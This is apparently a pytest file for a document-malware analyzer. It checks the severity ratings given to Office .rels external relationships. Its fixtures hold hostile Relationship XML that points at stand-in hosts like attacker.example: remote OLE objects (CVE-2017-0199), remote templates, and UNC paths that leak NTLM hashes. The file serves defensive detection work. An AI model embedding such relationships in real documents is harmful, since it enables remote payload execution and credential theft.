"""Office relationship (.rels) analyzer — CVE-2017-0199 + neighbours.

Pins precise classification per (rel_type, target) shape so future
refactors can't silently drop coverage of high-value attack chains:
remote OLE objects (CVE-2017-0199), remote attached templates,
NTLM hash leaks via UNC, external frames/altChunks/subDocuments.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from structure import Structure, Severity
from Utils.password_broker import PasswordBroker


@pytest.fixture(autouse=True)
def _clear():
    Structure.clear_cache()
    PasswordBroker.clear()
    yield
    Structure.clear_cache()
    PasswordBroker.clear()


def _rels(*relationships: str) -> bytes:
    """Build a minimal .rels XML body containing the given <Relationship>
    elements (already-formed strings)."""
    head = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/'
        b'package/2006/relationships">\n'
    )
    body = "\n".join(relationships).encode("utf-8") + b"\n"
    return head + body + b"</Relationships>\n"


def _analyze(rels_bytes: bytes):
    return Structure.create(
        data=rels_bytes,
        filename="document.xml.rels",
        mime_type="application/vnd.openxmlformats-package.relationships+xml",
    )


# ---------------------------------------------------------------
# CVE-2017-0199 — external oleObject
# ---------------------------------------------------------------


def test_remote_oleobject_is_critical_cve_2017_0199():
    rel = (
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        'relationships/oleObject" '
        'Target="https://attacker.example/payload.rtf" '
        'TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    findings = [r for k, r in s.analyzer.reports.items()
                if k.startswith("external_rel_oleobject_remote")]
    assert findings, list(s.analyzer.reports)
    assert findings[0].severity == Severity.CRITICAL
    assert "CVE-2017-0199" in findings[0].text


# ---------------------------------------------------------------
# Remote-template injection
# ---------------------------------------------------------------


def test_remote_attached_template_is_critical():
    rel = (
        '<Relationship Id="rId2" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        'relationships/attachedTemplate" '
        'Target="https://attacker.example/template.dotm" '
        'TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    findings = [r for k, r in s.analyzer.reports.items()
                if k.startswith("external_rel_remote_template")]
    assert findings
    assert findings[0].severity == Severity.CRITICAL


# ---------------------------------------------------------------
# NTLM hash exfiltration via UNC / file://
# ---------------------------------------------------------------


@pytest.mark.parametrize(
    "target",
    [
        "file://attacker.example/share/x.docx",
        "\\\\attacker.example\\share\\x.docx",
        "//attacker.example/share/x.docx",
    ],
)
def test_unc_target_is_critical_ntlm_leak(target):
    """Any UNC/file:// target leaks NetNTLMv2 — Word silently authenticates."""
    rel = (
        '<Relationship Id="rId3" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        f'relationships/oleObject" Target="{target}" TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    findings = [r for k, r in s.analyzer.reports.items()
                if k.startswith("external_rel_ntlm_leak")]
    assert findings, list(s.analyzer.reports)
    assert findings[0].severity == Severity.CRITICAL
    assert "NetNTLMv2" in findings[0].text


# ---------------------------------------------------------------
# Lower-severity external types
# ---------------------------------------------------------------


def test_external_frame_is_high():
    rel = (
        '<Relationship Id="rId4" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/frame" '
        'Target="https://attacker.example/frame.htm" TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    findings = [r for k, r in s.analyzer.reports.items()
                if k.startswith("external_rel_external_frame")]
    assert findings
    assert findings[0].severity == Severity.HIGH


def test_external_altchunk_is_high():
    rel = (
        '<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/altChunk" '
        'Target="https://attacker.example/chunk.html" TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    findings = [r for k, r in s.analyzer.reports.items()
                if k.startswith("external_rel_altchunk")]
    assert findings
    assert findings[0].severity == Severity.HIGH


def test_external_image_is_low():
    rel = (
        '<Relationship Id="rId6" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/image" '
        'Target="https://attacker.example/pixel.gif" TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    findings = [r for k, r in s.analyzer.reports.items()
                if k.startswith("external_rel_external_image")]
    assert findings
    assert findings[0].severity == Severity.LOW


def test_external_hyperlink_is_info():
    rel = (
        '<Relationship Id="rId7" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/hyperlink" '
        'Target="https://example.org/" TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    findings = [r for k, r in s.analyzer.reports.items()
                if k.startswith("external_rel_external_hyperlink")]
    assert findings
    assert findings[0].severity == Severity.INFO


# ---------------------------------------------------------------
# Internal relationships are not flagged
# ---------------------------------------------------------------


def test_internal_relationship_no_finding():
    rel = (
        '<Relationship Id="rId8" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        'relationships/officeDocument" '
        'Target="word/document.xml"/>'
    )
    s = _analyze(_rels(rel))
    keys = [k for k in s.analyzer.reports if k.startswith("external_rel_")]
    assert keys == []
    assert "external_relationships" not in s.analyzer.reports


# ---------------------------------------------------------------
# Aggregate roll-up + IOC propagation
# ---------------------------------------------------------------


def test_aggregate_rollup_when_external_present():
    rel1 = (
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/oleObject" '
        'Target="https://attacker.example/p.rtf" TargetMode="External"/>'
    )
    rel2 = (
        '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/image" '
        'Target="https://tracker.example/pixel.gif" TargetMode="External"/>'
    )
    s = _analyze(_rels(rel1, rel2))
    rollup = s.analyzer.reports.get("external_relationships")
    assert rollup is not None
    assert rollup.severity == Severity.CRITICAL  # worst across the set
    assert rollup.data["count"] == 2


def test_external_url_flows_to_iocs_aggregate():
    """The CVE-2017-0199 remote OLE URL must surface in the root
    iocs_aggregate (defanged) via standard report.text harvesting."""
    rel = (
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
        'officeDocument/2006/relationships/oleObject" '
        'Target="https://malicious.example/payload.rtf" '
        'TargetMode="External"/>'
    )
    s = _analyze(_rels(rel))
    agg = s.analyzer.reports.get("iocs_aggregate")
    assert agg is not None
    # Defang propagates through extract_iocs
    text = agg.text
    assert "malicious" in text
